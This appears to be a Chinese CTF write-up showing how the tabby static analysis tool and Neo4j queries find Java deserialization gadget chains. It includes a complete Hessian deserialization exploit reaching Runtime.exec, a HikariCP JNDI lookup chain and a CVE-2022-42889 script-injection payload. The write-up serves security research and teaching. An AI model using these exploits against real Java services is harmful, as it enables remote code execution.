# Java代码分析工具Tabby在CTF中的运用

> 原文: https://www.ctfiot.com/64572.html
> ID: 64572

前言

随着静态分析技术的不断发展，越来越多安全研究人员开始利用静态分析技术来解决问题，相比于传统手段，利用静态分析技术可以大大减少漏洞挖掘成本和时间，本文将尝试利用一款Java静态代码分析工具tabby来解决最近几场CTF中的题目。

tabby是一款专门针对Java语言的静态代码分析工具，它基于soot框架生成Java程序的代码属性图并使用Neo4j来存储，我们可以编写Neo4j查询语句来查询代码中存在的调用链。

前期准备

关于tabby的基础安装和使用方法已经在其项目主页写的很详细了，参考文末给出的链接即可；这里来介绍一下它的一个扩展tabby-path-finder，该扩展是tabby的污点分析扩展，相对于普通查询，个人实测当链路节点较长时，利用该扩展可以较为精准的查询链路；详细的介绍可以参考下面的项目链接，后续的具体操作会涉及到该扩展。

https://github.com/wh1t3p1g/tabby-path-finder

To CTF

2022长城杯-b4bycoffee[新解]

反编译jar可以看到题目存在着反序列化点，并且有rome依赖。

反序列化ban掉了这几个类

this.list = new ArrayList<>();
this.list.add(BadAttributeValueExpException.class.getName());
this.list.add(ObjectBean.class.getName());
this.list.add(ToStringBean.class.getName());
this.list.add(TemplatesImpl.class.getName());
this.list.add(Runtime.class.getName());

同时Coffeebean中toString存在着能加载字节码的后门

如果分析过rome反序列化的同学们一眼就能看出来黑名单中没ban掉EqualsBean ，而在链子中EqualsBean的hashcode方法可以触发到任意类的toString方法；很容易想到如下链子

java.util.HashMap#readObject
java.util.HashMap#hash
com.rometools.rome.feed.impl.EqualsBean#hashCode
com.rometools.rome.feed.impl.EqualsBean#beanHashCode
com.example.b4bycoffee.model.CoffeeBean#toString

那么我们可以思考一下，如果没有rome依赖还能利用吗？

归纳一下当前的问题，我们需要一个readObject->toString的链子，则我们可以利用tabby写出如下查询语句

match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
match (sink:Method {NAME:"toString"})
with source, collect(sink) as sinks
call tabby.algo.findJavaGadget(source, sinks, 12, false) yield path where none(n in nodes(path) where n.CLASSNAME in ["javax.management.BadAttributeValueExpException","com.sun.jmx.snmp.SnmpEngineId","com.sun.xml.internal.ws.api.BindingID","javax.swing.text.html.HTML$UnknownTag"])
return path limit 1

可以看到在jdk中是存在这样的链条的，调用关系如下

java.util.HashMap#readObject
java.util.HashMap#putVal
java.lang.Object#equals
com.sun.org.apache.xpath.internal.objects.XString#equals
com.example.b4bycoffee.model.CoffeeBean#toString

exp文中就不给出了，根据调用关系很容易写出来

2022TCTF-HessianOnlyJdk

题目考察了hessian的jdk原生的链子，我们可以尝试用tabby来跑一下该链子，首先来总结下hessian反序列化的特性

1.hessian可反序列化不继承自Serializable的类
2.反序列化的起始方法可以为 equals,hashCode,compareTo 方法
3.反序列化时不能恢复Iterator,Enumeration,Map,List类型的值

根据上述条件可以写出如下查询语句

match (source:Method) where source.NAME in ["equals","hashCode","compareTo"] 
with collect(source) as sources
match (sink:Method {IS_SINK:true}) where sink.NAME =~ "invoke" and sink.VUL =~ "CODE" and sink.CLASSNAME =~ "java.lang.reflect.Method"
with sources, collect(sink) as sinks
call tabby.algo.allSimplePaths(sinks,sources, 15, false) yield path 
where none(n in nodes(path) where (n.CLASSNAME =~ "java.util.Iterator" or n.CLASSNAME =~ "java.util.Enumeration" or n.CLASSNAME =~ "java.util.Map" or n.CLASSNAME =~ "java.util.List" or n.CLASSNAME=~"jdk.nashorn.internal.ir.UnaryNode" or n.CLASSNAME=~"com.sun.jndi.ldap.ClientId" or n.CLASSNAME=~"org.apache.catalina.webresources.TrackedInputStream"))
return path limit 1

可以成功查询到题目提示的链条

我们可以注意到链条中用到了HashTable的get方法，在HashTable的equals中存在着get的调用，所以直接利用java.util.Hashtable#equals起始即可，题目中ban掉了com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename 这个写文件的方法，我们可以梳理下目前的source需求

1.目标方法需要为public 和 static的
2.sink可以为代码执行，写文件，远程类加载等

在tabby中内置了一些sink点，分析上面被ban掉的方法我们可以发现调用链长度仅仅为1，这里我们可以查一下sink点有没有直接符合要求的,这里以代码执行为例

match (m1:Method) where m1.VUL="CODE" and m1.IS_STATIC=true and m1.IS_PUBLIC=true
return m1 limit 50

可以看到查询结果中 sun.reflect.misc.MethodUtil.invoke 符合我们的要求，这个方法其他wp文章中也有阐述；则可以编写exp如下

package test;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import marshalsec.util.Reflections;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;
import javax.swing.*;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Hashtable;

public class Test {
    public static void main(String[] args) throws Exception {
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        Class<?> cMimeTypeParameterList = Class.forName("java.awt.datatransfer.MimeTypeParameterList");
        Constructor<?> conMimeTypeParameterList= cMimeTypeParameterList.getDeclaredConstructor();
        conMimeTypeParameterList.setAccessible(true);
        Object mimeTypeParameterList = conMimeTypeParameterList.newInstance();
        Field fparameters = cMimeTypeParameterList.getDeclaredField("parameters");
        fparameters.setAccessible(true);
        Hashtable<String, String> stringHashtable = new Hashtable<>();
        stringHashtable.put("abc","xxxxxxxxxxxx");

        Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
        Method mexec = Runtime.class.getMethod("exec", String.class);
        Object runtime = Runtime.getRuntime();
        Object[] ags = new Object[]{invoke, new Object(), new Object[]{mexec,runtime , new Object[]{"calc"}}};
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke",ags);
        Object[] keyValueList = new Object[]{"abc",swingLazyValue};
        UIDefaults uiDefaults1 = new UIDefaults(keyValueList);
        UIDefaults uiDefaults2 = new UIDefaults(keyValueList);

        Hashtable<Object, Object> hashtable1 = new Hashtable<>();
        Hashtable<Object, Object> hashtable2 = new Hashtable<>();
        hashtable1.put("a",uiDefaults1);
        hashtable2.put("a",uiDefaults2);

        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, hashtable1, hashtable1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, hashtable2, hashtable2, null));
        Reflections.setFieldValue(s, "table", tbl);
        Hessian2Output hessian2Output = new Hessian2Output(new FileOutputStream("hessian.ser"));
        hessian2Output.setSerializerFactory(serializerFactory);
        hessian2Output.writeObject(s);
        fparameters.set(mimeTypeParameterList,uiDefaults1);
        hessian2Output.close();
        Hessian2Input hessian2Input = new Hessian2Input(new FileInputStream("hessian.ser"));
        hessian2Input.readObject();
    }
}

2022网鼎杯青龙组-web214

可以看到题目存在着和rome中ToStringBean相同的toString方法，该方法可调用目标类的所有getter，同时存在着hessian反序列化点和HikariCP依赖，其中hessian的反序列化用的是dubbo中的hessian依赖。

其实本题目直接用上文tctf的原生链子就可以了，不过我们可以尝试使用tabby来跑一下HikariCP中的链子，HikariCP是个JDBC连接池组件，所以我们可以尝试跑下jndi的调用

match path=(m1:Method)-[:CALL*..10]->(m2:Method {IS_SINK:true}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and m2.VUL="JNDI" and m2.NAME="lookup"
return path limit 2

可以查询出很多条可用的链，排除hessian中的黑名单最后可以得到HikariCP中这样的一条

com.zaxxer.hikari.HikariDataSource#getConnection()
com.zaxxer.hikari.pool.HikariPool.<init>
com.zaxxer.hikari.pool.PoolBase.initializeDataSource
javax.naming.InitialContext.lookup

Study From RealWorld

CVE-2022-42889

我们可以通过分析过往漏洞来增加我们的查找规则，这里以这几天Apache Commons Text的漏洞举一个例子，测试代码只有简短的两行

StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
interpolator.replace("${script:js:java.lang.Runtime.getRuntime().exec("calc")}");

分析过后我们可以发现该处漏洞最后是利用ScriptEngineManager来执行脚本代码的，而在tabby中其实内置sink点是没有考虑到这种情况的，所以我们可以手工在配置文件中添加sink

{"name":"javax.script.ScriptEngine", "rules": [{"function": "eval", "type": "sink", "vul": "ScriptEval", "actions": {}, "polluted": [0], "signatures": ["<javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)>"]}]}

添加后我们可以编写查询语句测试下

match (source:Method) where source.NAME="replace" and source.CLASSNAME="org.apache.commons.text.StringSubstitutor"
with collect(source) as sources
match (sink:Method {IS_SINK:true}) where sink.VUL =~ "ScriptEval"
with sources, collect(sink) as sinks
call tabby.algo.allSimplePaths(sinks,sources,10, false) yield path 
where none(n in nodes(path) where (n.CLASSNAME =~ "java.util.Iterator" or n.CLASSNAME =~ "java.util.Enumeration" or n.CLASSNAME =~ "java.util.Map" or n.CLASSNAME =~ "java.util.List" ))
return path limit 1

可以发现其实这个漏洞与Apache Commons Configuration 的代码执行如出一辙，这也提醒我们通过分析过往漏洞进行总结可以更有效的辅助我们进行新漏洞的挖掘

总结

不限于CTF，在实际的漏洞挖掘中我们也可以使用tabby来大幅度地减少工作量，但工具的使用效果归根结底还是在于使用者的思路；从上面的分析我们可以发现tabby并不能直接帮助你自动化的找到漏洞，同时分析结果往往也取决于规则库的完善程度。

欢迎关注“春秋伽玛”公众号，未来笔者将结合真实的漏洞挖掘案例来分享静态分析工具在真实环境中的灵活用法，敬请期待。

Reference

https://github.com/wh1t3p1g/tabby
https://github.com/wh1t3p1g/tabby/wiki/Tabby食用指北

推荐阅读

使用CodeQL分析CTF题目


```
this.list = new ArrayList<>();
this.list.add(BadAttributeValueExpException.class.getName());
this.list.add(ObjectBean.class.getName());
this.list.add(ToStringBean.class.getName());
this.list.add(TemplatesImpl.class.getName());
this.list.add(Runtime.class.getName());
```



```
java.util.HashMap#readObject
java.util.HashMap#hash
com.rometools.rome.feed.impl.EqualsBean#hashCode
com.rometools.rome.feed.impl.EqualsBean#beanHashCode
com.example.b4bycoffee.model.CoffeeBean#toString
```



```
match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
match (sink:Method {NAME:"toString"})
with source, collect(sink) as sinks
call tabby.algo.findJavaGadget(source, sinks, 12, false) yield path where none(n in nodes(path) where n.CLASSNAME in ["javax.management.BadAttributeValueExpException","com.sun.jmx.snmp.SnmpEngineId","com.sun.xml.internal.ws.api.BindingID","javax.swing.text.html.HTML$UnknownTag"])
return path limit 1
```



```
java.util.HashMap#readObject
java.util.HashMap#putVal
java.lang.Object#equals
com.sun.org.apache.xpath.internal.objects.XString#equals
com.example.b4bycoffee.model.CoffeeBean#toString
```



```
1.hessian可反序列化不继承自Serializable的类
2.反序列化的起始方法可以为 equals,hashCode,compareTo 方法
3.反序列化时不能恢复Iterator,Enumeration,Map,List类型的值
```



```
match (source:Method) where source.NAME in ["equals","hashCode","compareTo"] 
with collect(source) as sources
match (sink:Method {IS_SINK:true}) where sink.NAME =~ "invoke" and sink.VUL =~ "CODE" and sink.CLASSNAME =~ "java.lang.reflect.Method"
with sources, collect(sink) as sinks
call tabby.algo.allSimplePaths(sinks,sources, 15, false) yield path 
where none(n in nodes(path) where (n.CLASSNAME =~ "java.util.Iterator" or n.CLASSNAME =~ "java.util.Enumeration" or n.CLASSNAME =~ "java.util.Map" or n.CLASSNAME =~ "java.util.List" or n.CLASSNAME=~"jdk.nashorn.internal.ir.UnaryNode" or n.CLASSNAME=~"com.sun.jndi.ldap.ClientId" or n.CLASSNAME=~"org.apache.catalina.webresources.TrackedInputStream"))
return path limit 1
```



```
1.目标方法需要为public 和 static的
2.sink可以为代码执行，写文件，远程类加载等
```



```
match (m1:Method) where m1.VUL="CODE" and m1.IS_STATIC=true and m1.IS_PUBLIC=true
return m1 limit 50
```



```
package test;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import marshalsec.util.Reflections;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;
import javax.swing.*;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Hashtable;

public class Test {
    public static void main(String[] args) throws Exception {
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        Class<?> cMimeTypeParameterList = Class.forName("java.awt.datatransfer.MimeTypeParameterList");
        Constructor<?> conMimeTypeParameterList= cMimeTypeParameterList.getDeclaredConstructor();
        conMimeTypeParameterList.setAccessible(true);
        Object mimeTypeParameterList = conMimeTypeParameterList.newInstance();
        Field fparameters = cMimeTypeParameterList.getDeclaredField("parameters");
        fparameters.setAccessible(true);
        Hashtable<String, String> stringHashtable = new Hashtable<>();
        stringHashtable.put("abc","xxxxxxxxxxxx");

        Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
        Method mexec = Runtime.class.getMethod("exec", String.class);
        Object runtime = Runtime.getRuntime();
        Object[] ags = new Object[]{invoke, new Object(), new Object[]{mexec,runtime , new Object[]{"calc"}}};
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke",ags);
        Object[] keyValueList = new Object[]{"abc",swingLazyValue};
        UIDefaults uiDefaults1 = new UIDefaults(keyValueList);
        UIDefaults uiDefaults2 = new UIDefaults(keyValueList);

        Hashtable<Object, Object> hashtable1 = new Hashtable<>();
        Hashtable<Object, Object> hashtable2 = new Hashtable<>();
        hashtable1.put("a",uiDefaults1);
        hashtable2.put("a",uiDefaults2);

        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, hashtable1, hashtable1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, hashtable2, hashtable2, null));
        Reflections.setFieldValue(s, "table", tbl);
        Hessian2Output hessian2Output = new Hessian2Output(new FileOutputStream("hessian.ser"));
        hessian2Output.setSerializerFactory(serializerFactory);
        hessian2Output.writeObject(s);
        fparameters.set(mimeTypeParameterList,uiDefaults1);
        hessian2Output.close();
        Hessian2Input hessian2Input = new Hessian2Input(new FileInputStream("hessian.ser"));
        hessian2Input.readObject();
    }
}
```



```
match path=(m1:Method)-[:CALL*..10]->(m2:Method {IS_SINK:true}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and m2.VUL="JNDI" and m2.NAME="lookup"
return path limit 2
```



```
com.zaxxer.hikari.HikariDataSource#getConnection()
com.zaxxer.hikari.pool.HikariPool.<init>
com.zaxxer.hikari.pool.PoolBase.initializeDataSource
javax.naming.InitialContext.lookup
```



```
StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
interpolator.replace("${script:js:java.lang.Runtime.getRuntime().exec("calc")}");
```



```
{"name":"javax.script.ScriptEngine", "rules": [{"function": "eval", "type": "sink", "vul": "ScriptEval", "actions": {}, "polluted": [0], "signatures": ["<javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)>"]}]}
```



```
match (source:Method) where source.NAME="replace" and source.CLASSNAME="org.apache.commons.text.StringSubstitutor"
with collect(source) as sources
match (sink:Method {IS_SINK:true}) where sink.VUL =~ "ScriptEval"
with sources, collect(sink) as sinks
call tabby.algo.allSimplePaths(sinks,sources,10, false) yield path 
where none(n in nodes(path) where (n.CLASSNAME =~ "java.util.Iterator" or n.CLASSNAME =~ "java.util.Enumeration" or n.CLASSNAME =~ "java.util.Map" or n.CLASSNAME =~ "java.util.List" ))
return path limit 1
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1666238627.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/4-1666238629.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1666238630.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/1-1666238631.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666238631.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1666238632.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1666238634.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666238635.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1666238637.gif)